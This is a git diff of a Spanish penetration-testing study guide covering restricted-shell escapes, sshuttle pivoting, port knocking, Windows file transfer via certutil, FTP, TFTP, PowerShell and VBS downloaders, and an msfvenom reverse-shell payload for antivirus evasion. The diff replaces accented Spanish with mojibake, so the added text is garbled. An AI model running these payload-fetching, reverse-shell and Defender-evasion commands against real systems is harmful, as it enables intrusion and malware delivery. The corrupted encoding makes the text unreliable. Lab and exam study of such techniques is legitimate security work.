 intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O;
 min = 1; time = 0;
@@ -3145,20 +3144,20 @@ isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echo
 
 ```
 
-Tal y como podemos ver, figuran los números de filas y columnas, 44 y 190 respectivamente para este caso. Copiamos dicha configuración en la máquina que hemos comprometido donde se ha llevado a cabo toda la previa configuración, aplicando para ello el siguiente comandos:
+Tal y como podemos ver, figuran los nÃºmeros de filas y columnas, 44 y 190 respectivamente para este caso. Copiamos dicha configuraciÃ³n en la mÃ¡quina que hemos comprometido donde se ha llevado a cabo toda la previa configuraciÃ³n, aplicando para ello el siguiente comandos:
 
 ```bash
 stty rows 44 columns 190
 ```
 
-El resultado final será una Shell completamente interactiva, donde nos sentiremos como si hubiéramos ganado acceso por SSH, con capacidad de tabulación, uso de Shortcuts (Ctrl+C, Ctrl+L, etc.), sesiones interactivas, etc.
+El resultado final serÃ¡ una Shell completamente interactiva, donde nos sentiremos como si hubiÃ©ramos ganado acceso por SSH, con capacidad de tabulaciÃ³n, uso de Shortcuts (Ctrl+C, Ctrl+L, etc.), sesiones interactivas, etc.
 
 
 #### Process Monitoring
 
-A la hora de escalar privilegios, es una buena idea montarse un script **procmon.sh** para la monitorización de procesos y comandos aplicados a nivel de sistema en tiempo real.
+A la hora de escalar privilegios, es una buena idea montarse un script **procmon.sh** para la monitorizaciÃ³n de procesos y comandos aplicados a nivel de sistema en tiempo real.
 
-Para ello, tan sólo tendremos que crear un script sobre el sistema como el siguiente:
+Para ello, tan sÃ³lo tendremos que crear un script sobre el sistema como el siguiente:
 
 ```bash
 #!/bin/bash
@@ -3172,29 +3171,29 @@ while true; do
 done
 ```
 
-Tras su ejecución, tendremos una visual de toods los comandos que se están aplicando a nivel de sistema, incluidos los llevados a cabo por el usuario root del equipo, incluyendo rutas y subprocesos.
+Tras su ejecuciÃ³n, tendremos una visual de toods los comandos que se estÃ¡n aplicando a nivel de sistema, incluidos los llevados a cabo por el usuario root del equipo, incluyendo rutas y subprocesos.
 
 #### Escaping Restricted Shell
 
-Con el objetivo de preparar un escenario realista, presentaré 2 casos, partiendo de una escapada convencional a otra un poco más rebuscada. También hay que decir que todo dependerá del nivel de restricción que el administrador haya implementado sobre el usuario.
+Con el objetivo de preparar un escenario realista, presentarÃ© 2 casos, partiendo de una escapada convencional a otra un poco mÃ¡s rebuscada. TambiÃ©n hay que decir que todo dependerÃ¡ del nivel de restricciÃ³n que el administrador haya implementado sobre el usuario.
 
 Para el primer caso, seguimos los siguientes pasos para preparar nuestro escenario de usuario:
 
 ```bash
-┌─[root@parrot]─[/home]
-└──╼ #mkdir testuser
-┌─[root@parrot]─[/home]
-└──╼ #useradd testuser -d /home/testuser -s /bin/rbash
-┌─[root@parrot]─[/home]
-└──╼ #passwd testuser
-Introduzca la nueva contraseña de UNIX: 
-Vuelva a escribir la nueva contraseña de UNIX: 
-passwd: contraseña actualizada correctamente
-┌─[root@parrot]─[/home]
-└──╼ #chown testuser:testuser /home/testuser
+â”Œâ”€[root@parrot]â”€[/home]
+â””â”€â”€â•¼ #mkdir testuser
+â”Œâ”€[root@parrot]â”€[/home]
+â””â”€â”€â•¼ #useradd testuser -d /home/testuser -s /bin/rbash
+â”Œâ”€[root@parrot]â”€[/home]
+â””â”€â”€â•¼ #passwd testuser
+Introduzca la nueva contraseÃ±a de UNIX: 
+Vuelva a escribir la nueva contraseÃ±a de UNIX: 
+passwd: contraseÃ±a actualizada correctamente
+â”Œâ”€[root@parrot]â”€[/home]
+â””â”€â”€â•¼ #chown testuser:testuser /home/testuser
 ```
 
-En este caso, la contraseña asignada ha sido **test123**. Como vemos, se ha asignado una shell restrictiva al usuario **testuser**, esto lo podemos comprobar a través de la variable **export**:
+En este caso, la contraseÃ±a asignada ha sido **test123**. Como vemos, se ha asignado una shell restrictiva al usuario **testuser**, esto lo podemos comprobar a travÃ©s de la variable **export**:
 
 ```bash
 testuser@parrot:~$ export
@@ -3219,7 +3218,7 @@ declare -x XDG_SESSION_ID="80"
 testuser@parrot:~$ 
 ```
 
-Tal y como vemos en la variable **SHELL**, tenemos la _restricted bash_. Si un administrador de sistemas asigna esta shell a un usuario, en un principio se toparía con estos inconvenientes:
+Tal y como vemos en la variable **SHELL**, tenemos la _restricted bash_. Si un administrador de sistemas asigna esta shell a un usuario, en un principio se toparÃ­a con estos inconvenientes:
 
 ```bash
 testuser@parrot:~$ pwd
@@ -3240,7 +3239,7 @@ drwxr-xr-x 2 testuser testuser 4096 nov 11 23:52 directorio
 -rw-r--r-- 1 testuser testuser    0 nov 11 23:52 fichero
 ```
 
-Existen ciertos inconvenientes en cuanto a movilidad respecta, aunque sí que es cierto que en cuanto a visualización, podemos visualizar cualquier recurso del sistema sin mayor inconveniente. Un administrador de sistemas poco experimentado, podría no tener en cuenta lo siguiente:
+Existen ciertos inconvenientes en cuanto a movilidad respecta, aunque sÃ­ que es cierto que en cuanto a visualizaciÃ³n, podemos visualizar cualquier recurso del sistema sin mayor inconveniente. Un administrador de sistemas poco experimentado, podrÃ­a no tener en cuenta lo siguiente:
 
 ```bash
 testuser@parrot:~$ echo $SHELL
@@ -3259,43 +3258,43 @@ testuser@parrot:/$ pwd
 testuser@parrot:/$ 
 ```
 
-Con la misma, el usuario se ha escapado a una **bash**, teniendo mayor movilidad sobre el sistema. Es por ello que como buena medida, además de asignar dicha Shell se haga algo como esto:
+Con la misma, el usuario se ha escapado a una **bash**, teniendo mayor movilidad sobre el sistema. Es por ello que como buena medida, ademÃ¡s de asignar dicha Shell se haga algo como esto:
 
 ```bash
-┌─[root@parrot]─[/home/testuser]
-└──╼ #pwd
+â”Œâ”€[root@parrot]â”€[/home/testuser]
+â””â”€â”€â•¼ #pwd
 /home/testuser
-┌─[root@parrot]─[/home/testuser]
-└──╼ #mkdir bin
-┌─[root@parrot]─[/home/testuser]
-└──╼ #cd !$
+â”Œâ”€[root@parrot]â”€[/home/testuser]
+â””â”€â”€â•¼ #mkdir bin
+â”Œâ”€[root@parrot]â”€[/home/testuser]
+â””â”€â”€â•¼ #cd !$
 cd bin
-┌─[root@parrot]─[/home/testuser/bin]
-└──╼ #cp /bin/ping .
-┌─[root@parrot]─[/home/testuser/bin]
-└──╼ #cp /usr/bin/tee .
-┌─[root@parrot]─[/home/testuser/bin]
-└──╼ #cp /bin/ls .
-┌─[root@parrot]─[/home/testuser/bin]
-└──╼ #ls
+â”Œâ”€[root@parrot]â”€[/home/testuser/bin]
+â””â”€â”€â•¼ #cp /bin/ping .
+â”Œâ”€[root@parrot]â”€[/home/testuser/bin]
+â””â”€â”€â•¼ #cp /usr/bin/tee .
+â”Œâ”€[root@parrot]â”€[/home/testuser/bin]
+â””â”€â”€â•¼ #cp /bin/ls .
+â”Œâ”€[root@parrot]â”€[/home/testuser/bin]
+â””â”€â”€â•¼ #ls
 ls  ping  tee
-┌─[root@parrot]─[/home/testuser/bin]
-└──╼ #chmod o+w ping
-┌─[root@parrot]─[/home/testuser/bin]
-└──╼ #cd ..
-┌─[root@parrot]─[/home/testuser]
-└──╼ #echo -e "PATH=/home/testuser/bin\nexport PATH" > .bashrc
-┌─[root@parrot]─[/home/testuser]
-└──╼ #cat .bashrc
+â”Œâ”€[root@parrot]â”€[/home/testuser/bin]
+â””â”€â”€â•¼ #chmod o+w ping
+â”Œâ”€[root@parrot]â”€[/home/testuser/bin]
+â””â”€â”€â•¼ #cd ..
+â”Œâ”€[root@parrot]â”€[/home/testuser]
+â””â”€â”€â•¼ #echo -e "PATH=/home/testuser/bin\nexport PATH" > .bashrc
+â”Œâ”€[root@parrot]â”€[/home/testuser]
+â””â”€â”€â•¼ #cat .bashrc
 PATH=/home/testuser/bin
 export PATH
 ```
 
-Como vemos en este caso el administrador de sistemas ha decidido que sólo pueda ejecutar esos 3 comandos (**ls ping tee**). 
+Como vemos en este caso el administrador de sistemas ha decidido que sÃ³lo pueda ejecutar esos 3 comandos (**ls ping tee**). 
 
-Este caso es a modo de ejemplo, y la asignación de permisos de escritura por parte de otros al binario **ping** se ha hecho a posta para que se vea cómo por esta simple tontería un usuario podría escapar de la restricted bash.
+Este caso es a modo de ejemplo, y la asignaciÃ³n de permisos de escritura por parte de otros al binario **ping** se ha hecho a posta para que se vea cÃ³mo por esta simple tonterÃ­a un usuario podrÃ­a escapar de la restricted bash.
 
-Veamos cómo sería la movilidad a nivel de usuario:
+Veamos cÃ³mo serÃ­a la movilidad a nivel de usuario:
 
 ```bash
 testuser@parrot:~$ echo $PATH
@@ -3303,29 +3302,29 @@ testuser@parrot:~$ echo $PATH
 testuser@parrot:~$ ls
 bin
 testuser@parrot:~$ cat .bashrc
-rbash: cat: no se encontró la orden
+rbash: cat: no se encontrÃ³ la orden
 testuser@parrot:~$ cat /etc/passwd
-rbash: cat: no se encontró la orden
+rbash: cat: no se encontrÃ³ la orden
 testuser@parrot:~$ cd ..
 rbash: cd: restringido
 testuser@parrot:~$ cd /
 rbash: cd: restringido
 testuser@parrot:~$ touch archivo
-rbash: touch: no se encontró la orden
+rbash: touch: no se encontrÃ³ la orden
 testuser@parrot:~$ mkdir directorio
-rbash: mkdir: no se encontró la orden
+rbash: mkdir: no se encontrÃ³ la orden
 testuser@parrot:~$ ls bin
 ls  ping  tee
 testuser@parrot:~$ ping -c 1 localhost
-ping: socket: Operación no permitida
+ping: socket: OperaciÃ³n no permitida
 testuser@parrot:~$ ping localhost
-ping: socket: Operación no permitida
+ping: socket: OperaciÃ³n no permitida
 testuser@parrot:~$ 
 ```
 
-El usuario está mucho más limitado, pues sus binarios se encuentran bajo el directorio /bin de su home y sólo puede ejecutar 3 comandos muy básicos. Como vemos, el usuario **testuser** no puede visualizar el recurso **.bashrc**, donde está definido su PATH. Esto es así debido a que no puede ejecutar el comando **cat**.
+El usuario estÃ¡ mucho mÃ¡s limitado, pues sus binarios se encuentran bajo el directorio /bin de su home y sÃ³lo puede ejecutar 3 comandos muy bÃ¡sicos. Como vemos, el usuario **testuser** no puede visualizar el recurso **.bashrc**, donde estÃ¡ definido su PATH. Esto es asÃ­ debido a que no puede ejecutar el comando **cat**.
 
-Sin embargo, aprovechando el permiso que el administrador del sistema asignó al binario **ping**, el usuario puede hacer lo siguiente para visualizar el recurso a modo de ejemplo:
+Sin embargo, aprovechando el permiso que el administrador del sistema asignÃ³ al binario **ping**, el usuario puede hacer lo siguiente para visualizar el recurso a modo de ejemplo:
 
 ```bash
 testuser@parrot:~$ ls -l bin
@@ -3343,7 +3342,7 @@ export PATH
 testuser@parrot:~$ 
 ```
 
-Dado que algo típico en el **rbash** es el no poder utilizar los operadores **> / >>** para redirigir la salida de comandos, el usuario se puede aprovechar de la utilidad de **rbash** para depositar contenido sobre su directorio personal, así como sobre el recurso **ping** situado en el directorio **bin/**. 
+Dado que algo tÃ­pico en el **rbash** es el no poder utilizar los operadores **> / >>** para redirigir la salida de comandos, el usuario se puede aprovechar de la utilidad de **rbash** para depositar contenido sobre su directorio personal, asÃ­ como sobre el recurso **ping** situado en el directorio **bin/**. 
 
 De esta forma, dado que la variable **PATH** figura sobre dicho directorio, puede hacer que el binario **ping** tome una nueva funcionalidad, donde como vemos, se aprovecha de la misma para visualizar el recurso **.bashrc**. Una vez ve que el problema radica en dicho recurso, puede aplicar el siguiente movimiento lateral:
 
@@ -3355,7 +3354,7 @@ testuser@parrot:~$ echo '/bin/rm /home/testuser/.bashrc' | tee -a bin/ping
 testuser@parrot:~$ ls -a
 .  ..  .bash_history  .bashrc  bin  .gnupg
 testuser@parrot:~$ ping
-/bin/rm: ¿borrar el fichero regular '/home/testuser/.bashrc'  protegido contra escritura? (s/n) s
+/bin/rm: Â¿borrar el fichero regular '/home/testuser/.bashrc'  protegido contra escritura? (s/n) s
 testuser@parrot:~$ ls -a
 .  ..  .bash_history  bin  .gnupg
 testuser@parrot:~$ 
@@ -3370,8 +3369,8 @@ testuser@parrot:~$ echo $SHELL
 /bin/rbash
 testuser@parrot:~$ exit
 exit
-┌─[root@parrot]─[/home/testuser]
-└──╼ #su testuser
+â”Œâ”€[root@parrot]â”€[/home/testuser]
+â””â”€â”€â•¼ #su testuser
 testuser@parrot:~$ echo $SHELL
 bash
 testuser@parrot:~$ cd ..
@@ -3382,7 +3381,7 @@ testuser@parrot:~$ echo $PATH
 /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/root/local/bin
 ```
 
-Ahora mismo, el usuario posee una bash tal y como figura en su variable de entorno **SHELL**, sin embargo, por alguna razón... sigue estando con las mismas restricciones. Llegados a este punto, lo único que debe hacer es el típico **shell spawning** aprovechando la utilidad de algún otro binario, dado que su **PATH** ahora cuenta con todas las rutas absolutas de los binarios del sistema.
+Ahora mismo, el usuario posee una bash tal y como figura en su variable de entorno **SHELL**, sin embargo, por alguna razÃ³n... sigue estando con las mismas restricciones. Llegados a este punto, lo Ãºnico que debe hacer es el tÃ­pico **shell spawning** aprovechando la utilidad de algÃºn otro binario, dado que su **PATH** ahora cuenta con todas las rutas absolutas de los binarios del sistema.
 
 Para el siguiente caso, lo hacemos aprovechando la utilidad **-exec** del comando **find**:
 
@@ -3421,7 +3420,7 @@ testuser@parrot:/home$
 
 #### Pivoting con Shuttle
 
-Aunque en el examen no caerán temas de Pivoting, nunca viene mal tener este concepto claro para saltar a otras redes (de cara a la máquinas del laboratorio para saltar a los distintos segmentos).
+Aunque en el examen no caerÃ¡n temas de Pivoting, nunca viene mal tener este concepto claro para saltar a otras redes (de cara a la mÃ¡quinas del laboratorio para saltar a los distintos segmentos).
 
 Yo en verdad no suelo ser muy partidario de esta herramienta, lo que suelo hacer en su defecto es aplicar un '_Dynamic Port Forwarding_', de este modo sobre el sistema:
 
@@ -3429,9 +3428,9 @@ Yo en verdad no suelo ser muy partidario de esta herramienta, lo que suelo hacer
 ssh -D 1080 usuario@host
 ```
 
-Y diréis, ah... pero hay que conocer la password. Obviamente... si comprometes un equipo, será a fondo, lo mismo sucederá con **Shuttle**.
+Y dirÃ©is, ah... pero hay que conocer la password. Obviamente... si comprometes un equipo, serÃ¡ a fondo, lo mismo sucederÃ¡ con **Shuttle**.
 
-Una vez hecha la conexión, tendremos que aplicar la siguiente configuración desde el fichero '_/etc/proxychains.conf_':
+Una vez hecha la conexiÃ³n, tendremos que aplicar la siguiente configuraciÃ³n desde el fichero '_/etc/proxychains.conf_':
 
 ```bash
 [ProxyList]
@@ -3441,39 +3440,39 @@ Una vez hecha la conexión, tendremos que aplicar la siguiente configuración de
 socks4  127.0.0.1 1080
 ```
 
-De esta forma, conseguimos que a la hora de aplicar la siguiente sintaxis sobre un Host al que no deberíamos tener conectividad:
+De esta forma, conseguimos que a la hora de aplicar la siguiente sintaxis sobre un Host al que no deberÃ­amos tener conectividad:
 
 ```bash
 $~ proxychains ssh root@ipOtroSegmento
 ```
 
-Tengamos alcance y nos resuelva el servicio. Para los escaneos con **nmap** sucede lo mismo, solo que hay que añadir una ligera variación en cuanto a parámetros respecta:
+Tengamos alcance y nos resuelva el servicio. Para los escaneos con **nmap** sucede lo mismo, solo que hay que aÃ±adir una ligera variaciÃ³n en cuanto a parÃ¡metros respecta:
 
 ```bash
 $~ proxychains nmap -p21,80,443 -r -v --open -T5 -v -Pn -T5 -n -oG openPorts
 ```
 
-Tendremos que añadir los parámetros '-T5 -Pn' generalmente, lo mismo para escanear a fondo dichos puertos:
+Tendremos que aÃ±adir los parÃ¡metros '-T5 -Pn' generalmente, lo mismo para escanear a fondo dichos puertos:
 
 ```bash
 $~ proxychains nmap -p21,80,443 -Pn -T5 -sC -sV
 ```
 
-Dicho esto, explico el uso de **Shuttle**. Supongamos que acabamos de comprometer el sistema **192.168.1.X**, tenemos las credenciales del usuario **pepe** para conexión por SSH y descubrimos que desde dicho sistema tenemos conectividad con un nuevo segmento **10.2.15.0/24**. Una vez teniendo **shuttle** en nuestro sistema, lo único que tendremos que hacer es lo siguiente:
+Dicho esto, explico el uso de **Shuttle**. Supongamos que acabamos de comprometer el sistema **192.168.1.X**, tenemos las credenciales del usuario **pepe** para conexiÃ³n por SSH y descubrimos que desde dicho sistema tenemos conectividad con un nuevo segmento **10.2.15.0/24**. Una vez teniendo **shuttle** en nuestro sistema, lo Ãºnico que tendremos que hacer es lo siguiente:
 
 ```bash
 sshuttle -vr pepe@192.168.1.X:22000 10.2.15.1/24 -x 192.168.1.X
 ```
 
-Donde el parámetro '_-x_' es opcional, por el cual especificamos la propia IP del sistema para descartarla posteriormente del rango de conectividad. (Una tontería, pero bueno)
+Donde el parÃ¡metro '_-x_' es opcional, por el cual especificamos la propia IP del sistema para descartarla posteriormente del rango de conectividad. (Una tonterÃ­a, pero bueno)
 
 # Port Knocking
 
-Que no falte mencionar esta famosa practica para ocultar puertos. Para que sea entendible la utilidad sin entrar mucho a nivel técnico, digamos que tenemos un VPS por el cual accedemos normalmente por el puerto 22 hacia el servicio SSH. ¿Qué sucede?, que el servicio queda público de cara hacia fuera. Una práctica para proteger estos servicios es configurar una serie de puertos (generalmente 3), para de golpearlos hacer visible temporalmente estos servicios.
+Que no falte mencionar esta famosa practica para ocultar puertos. Para que sea entendible la utilidad sin entrar mucho a nivel tÃ©cnico, digamos que tenemos un VPS por el cual accedemos normalmente por el puerto 22 hacia el servicio SSH. Â¿QuÃ© sucede?, que el servicio queda pÃºblico de cara hacia fuera. Una prÃ¡ctica para proteger estos servicios es configurar una serie de puertos (generalmente 3), para de golpearlos hacer visible temporalmente estos servicios.
 
 Me explico, supongamos que tras un escaneo inicial, vemos que el puerto 22 para el servicio SSH figura como '_closed_'. Sin embargo, por X razones, sabemos que de aplicar un **Port Knocking** sobre los puertos 4264 4563 5798, el puerto 22 se abre temporalmente permitiendo conexiones entrantes al servicio.
 
-**¿Cómo hacemos para golpear dichos puertos y realizar la conexión?**
+**Â¿CÃ³mo hacemos para golpear dichos puertos y realizar la conexiÃ³n?**
 
 Los hay quienes se montan un script infumable, realmente no hace falta:
 
@@ -3481,21 +3480,21 @@ Los hay quienes se montan un script infumable, realmente no hace falta:
 $~ nmap -p4264,4563,5798 -r -T5 -PN && ssh usuario@ip
 ```
 
-Con hacer esto, se habilitaría temporalmente el servicio SSH sobre el puerto 22, visualizando la conexión asociada así como la autenticación para validar el usuario.
+Con hacer esto, se habilitarÃ­a temporalmente el servicio SSH sobre el puerto 22, visualizando la conexiÃ³n asociada asÃ­ como la autenticaciÃ³n para validar el usuario.
 
-Como **nmap** a veces es muy suyo y no sigue el orden fijado de puertos a escanear, asignamos el parámetro '_-n_' para que el **Port Knocking** haga efecto, pues en caso de golpearlos en el orden incorrecto simplemente no sucederá nada.
+Como **nmap** a veces es muy suyo y no sigue el orden fijado de puertos a escanear, asignamos el parÃ¡metro '_-n_' para que el **Port Knocking** haga efecto, pues en caso de golpearlos en el orden incorrecto simplemente no sucederÃ¡ nada.
 
 ### Pentesting Windows
 
-A pesar de implementar y poner en práctica otras técnicas que no describo en los siguiente puntos, enumero a continuación las que para mi son más importantes y las que considero que uno debe de tener bien claras para el correcto manejo sobre los equipos Windows como atacante, así como de cara al examen.
+A pesar de implementar y poner en prÃ¡ctica otras tÃ©cnicas que no describo en los siguiente puntos, enumero a continuaciÃ³n las que para mi son mÃ¡s importantes y las que considero que uno debe de tener bien claras para el correcto manejo sobre los equipos Windows como atacante, asÃ­ como de cara al examen.
 
 #### Transferencia de Archivos
 
-Tenemos distintas formas de transferir archivos desde la máquina Windows que hayamos comprometido. Para la primera de ellas, nos aprovechamos de **certutil**, compartiendo para ello un servidor en Python sobre nuestro equipo en los recursos que queramos compartir y aplicando el siguiente comando desde la máquina Windows:
+Tenemos distintas formas de transferir archivos desde la mÃ¡quina Windows que hayamos comprometido. Para la primera de ellas, nos aprovechamos de **certutil**, compartiendo para ello un servidor en Python sobre nuestro equipo en los recursos que queramos compartir y aplicando el siguiente comando desde la mÃ¡quina Windows:
 
 `certutil.exe -f -urlcache -split http://nuestraIP:puerto/recurso.exe output.exe`
 
-En caso de no contar con **certutil**, podemos montarnos un servicio FTP en local, para posteriormente desde la máquina Windows vía **FTP** obtener los recursos. Para ello, tendremos que crear un archivo _.txt_ sobre la máquina Windows con el siguiente contenido (IP local 192.168.1.45 a modo de ejemplo):
+En caso de no contar con **certutil**, podemos montarnos un servicio FTP en local, para posteriormente desde la mÃ¡quina Windows vÃ­a **FTP** obtener los recursos. Para ello, tendremos que crear un archivo _.txt_ sobre la mÃ¡quina Windows con el siguiente contenido (IP local 192.168.1.45 a modo de ejemplo):
 
 ```bash
 open 192.168.1.45 21
@@ -3517,50 +3516,50 @@ echo GET archivo >> ftp.txt
 echo bye >> ftp.txt
 ```
 
-Para que se realicen los pasos fijados sobre el fichero, es necesario desde la máquina Windows aplicar el siguiente comando:
+Para que se realicen los pasos fijados sobre el fichero, es necesario desde la mÃ¡quina Windows aplicar el siguiente comando:
 
 ```bash
 ftp -v -n -s:ftp.txt
 ```
 
-Una vez hecho, se realizará la transferencia y tendremos el recurso en la máquina Windows. Lo mismo habría valido para enviar archivos a nuestra máquina local.
+Una vez hecho, se realizarÃ¡ la transferencia y tendremos el recurso en la mÃ¡quina Windows. Lo mismo habrÃ­a valido para enviar archivos a nuestra mÃ¡quina local.
 
-En caso de evitar tener que realizar configuraciones a nivel de archivos para compartir el servidor FTP, podemos aplicar el siguiente comando desde la máquina Linux:
+En caso de evitar tener que realizar configuraciones a nivel de archivos para compartir el servidor FTP, podemos aplicar el siguiente comando desde la mÃ¡quina Linux:
 
 ```bash
 python -m pyftpdlib -p 21 -w
 ```
 
-Posteriormente, ejecutamos las mismas instrucciones del lado de la máquina comprometida.
+Posteriormente, ejecutamos las mismas instrucciones del lado de la mÃ¡quina comprometida.
 
-Otra vía para realizar la transferencia de archivos desde nuestra máquina de atacante a la máquina Windows comprometida es aprovecharse de la utilidad **TFTP**. Para ello, desde nuestra máquina de atacante, aplicamos el siguiente comando especificando el directorio cuyos recursos queremos compartir:
+Otra vÃ­a para realizar la transferencia de archivos desde nuestra mÃ¡quina de atacante a la mÃ¡quina Windows comprometida es aprovecharse de la utilidad **TFTP**. Para ello, desde nuestra mÃ¡quina de atacante, aplicamos el siguiente comando especificando el directorio cuyos recursos queremos compartir:
 
 ```bash
 atftpd --daemon --port 69 /tftp
 ```
 
-Una vez hecho, desde la máquina Windows, aplicamos el siguiente comando:
+Una vez hecho, desde la mÃ¡quina Windows, aplicamos el siguiente comando:
 
 ```bash
 tftp -i 192.168.1.45 GET nc.exe
 ```
 
-Otra vía para realizar transferencia de archivos es desde nuestra máquina de atacante, compartir los recursos a través de un servidor web vía Python:
+Otra vÃ­a para realizar transferencia de archivos es desde nuestra mÃ¡quina de atacante, compartir los recursos a travÃ©s de un servidor web vÃ­a Python:
 
 ```bash
 python -m SimpleHTTPServer 443
 ```
 
-Y desde la máquina Windows, aplicar los siguientes comandos de **Powershell**:
+Y desde la mÃ¡quina Windows, aplicar los siguientes comandos de **Powershell**:
 
 ```powershell
 powershell -c "(new-object  System.Net.WebClient).DownloadFile('http://192.168.1.45:443/file.exe','C:\Users\user\Desktop\file.exe')"
 
-# También podemos usar esta otra forma
+# TambiÃ©n podemos usar esta otra forma
 powershell Invoke-WebRequest "http://192.168.1.45:443/file.exe" -OutFile "C:\Users\user\Desktop\file.exe"
 ```
 
-Por si todas estas vías de transferencia de archivos se nos quedan cortas, podemos hacerlo a través de un script en **VBS**, que suele funcionar para la mayoría de las veces. Para ello, desde la máquina Windows, tendremos que aplicar las siguientes instrucciones:
+Por si todas estas vÃ­as de transferencia de archivos se nos quedan cortas, podemos hacerlo a travÃ©s de un script en **VBS**, que suele funcionar para la mayorÃ­a de las veces. Para ello, desde la mÃ¡quina Windows, tendremos que aplicar las siguientes instrucciones:
 
 ```bash
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
@@ -3590,13 +3589,13 @@ echo Next >> wget.vbs
 echo ts.Close >> wget.vbs
 ```
 
-Una vez definido el recurso **wget.vbs**, aplicamos el siguiente comando para una vez montando nuestro servidor web vía Python en la máquina atacante, descargar los recursos que consideremos:
+Una vez definido el recurso **wget.vbs**, aplicamos el siguiente comando para una vez montando nuestro servidor web vÃ­a Python en la mÃ¡quina atacante, descargar los recursos que consideremos:
 
 ```bash
 cscript wget.vbs http://192.168.1.45:443/file.exe file.exe
 ```
 
-Por si vemos que es mucha molestia estar definiendo todo el script _wget.vbs_, podemos acotarlo de la siguiente forma, y funcionará igualmente:
+Por si vemos que es mucha molestia estar definiendo todo el script _wget.vbs_, podemos acotarlo de la siguiente forma, y funcionarÃ¡ igualmente:
 
 ```bash
 echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1"); > wget.vbs
@@ -3610,19 +3609,19 @@ echo BinStream.Write(WinHttpReq.ResponseBody); >> wget.vbs
 echo BinStream.SaveToFile("out.bin"); >> wget.vbs
 ```
 
-Una vez hecho, desde la propia máquina comprometida aplicamos el siguiente comando para descargar los recursos que estemos compartiendo en local:
+Una vez hecho, desde la propia mÃ¡quina comprometida aplicamos el siguiente comando para descargar los recursos que estemos compartiendo en local:
 
 ```bash
 cscript /nologo wget.js http://192.168.1.45:443/recurso.exe
 ```
 
-En caso de haber ganado acceso al equipo Windows con **nishang** aprovechando la utilidad _Invoke-PowerShellTcp.ps1_ (aunque también sirve para consola normal, sólo que me gusta trabajar en este aspecto directamente desde la Powershell), algo que podemos hacer es realizar la transferencia por samba aprovechando **smbserver** de **Impacket**.
+En caso de haber ganado acceso al equipo Windows con **nishang** aprovechando la utilidad _Invoke-PowerShellTcp.ps1_ (aunque tambiÃ©n sirve para consola normal, sÃ³lo que me gusta trabajar en este aspecto directamente desde la Powershell), algo que podemos hacer es realizar la transferencia por samba aprovechando **smbserver** de **Impacket**.
 
-Para ello, desde nuestro equipo de atacante, aplicamos el siguiente comando bajo un directorio previo que hayamos creado específico para la compartición de archivos:
+Para ello, desde nuestro equipo de atacante, aplicamos el siguiente comando bajo un directorio previo que hayamos creado especÃ­fico para la comparticiÃ³n de archivos:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/smb]
-└──╼ #impacket-smbserver shared `pwd`
+â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/smb]
+â””â”€â”€â•¼ #impacket-smbserver shared `pwd`
 Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies
 
 [*] Config file parsed
@@ -3633,15 +3632,15 @@ Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies
 [*] Config file parsed
 ```
 
-A continuación, desde la máquina Windows desde la sesión Powershell, aplicamos el siguiente comando:
+A continuaciÃ³n, desde la mÃ¡quina Windows desde la sesiÃ³n Powershell, aplicamos el siguiente comando:
 
 ```bash
 New-PSDrive -Name "SharedFolder" -PSProvider "FileSystem" -Root "\\192.168.1.45\shared"
 ```
 
-Directamente, veremos como se llevará a cabo una sincronización de recursos, creando una unidad lógica **SharedFolder:\\** sobre el equipo Windows que se conecta a nuestra unidad lógica *_pwd_*, la cual sincroniza contra la unidad física donde se sitúa nuestro directorio **shared**, desde donde depositaremos nuestros archivos.
+Directamente, veremos como se llevarÃ¡ a cabo una sincronizaciÃ³n de recursos, creando una unidad lÃ³gica **SharedFolder:\\** sobre el equipo Windows que se conecta a nuestra unidad lÃ³gica *_pwd_*, la cual sincroniza contra la unidad fÃ­sica donde se sitÃºa nuestro directorio **shared**, desde donde depositaremos nuestros archivos.
 
-En primer lugar, cambiamos de unidad lógica en la máquina Windows:
+En primer lugar, cambiamos de unidad lÃ³gica en la mÃ¡quina Windows:
 
 ```bash
 cd SharedFolder:
@@ -3664,17 +3663,17 @@ Esto a su vez nos sirve para copiar archivos del recurso compartido por Samba.
 
 #### AV Evasion Genetic Malware
 
-A continuación, se detalla el procedimiento para crear **Malware Genético**, ideal y de utilidad para la evasión de antivirus así como del propio Windows Defender.
+A continuaciÃ³n, se detalla el procedimiento para crear **Malware GenÃ©tico**, ideal y de utilidad para la evasiÃ³n de antivirus asÃ­ como del propio Windows Defender.
 
-Para ello, necesitamos descargar en local el recurso [Ebowla](https://github.com/Genetic-Malware/Ebowla), así como tener instalado **GO** para la forma en la que compilaremos nuestro Malware.
+Para ello, necesitamos descargar en local el recurso [Ebowla](https://github.com/Genetic-Malware/Ebowla), asÃ­ como tener instalado **GO** para la forma en la que compilaremos nuestro Malware.
 
-Cuando todo esté preparado, una vez comprometida la máquina Windows, suponiendo para un caso práctico que tenemos que subir un archivo **.exe** para haciendo uso de **RottenPotato** poder escalar privilegios pasando como argumento dicho binario (el cual será ejecutado con privilegios de administrador), donde el Windows Defender nos detiene la ejecución del binario, lo primero será crear nuestro Malware desde **msfvenom**:
+Cuando todo estÃ© preparado, una vez comprometida la mÃ¡quina Windows, suponiendo para un caso prÃ¡ctico que tenemos que subir un archivo **.exe** para haciendo uso de **RottenPotato** poder escalar privilegios pasando como argumento dicho binario (el cual serÃ¡ ejecutado con privilegios de administrador), donde el Windows Defender nos detiene la ejecuciÃ³n del binario, lo primero serÃ¡ crear nuestro Malware desde **msfvenom**:
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.45 LPORT=443 -f exe -o shell.exe
 ```
 
-Una vez creado, a modo de ejemplo jugando con una simple variable de entorno, aplicamos el siguiente comando en la máquina Windows:
+Una vez creado, a modo de ejemplo jugando con una simple variable de entorno, aplicamos el siguiente comando en la mÃ¡quina Windows:
 
 ```bash
 C:\Users\s4vitar\Desktop\ hostname
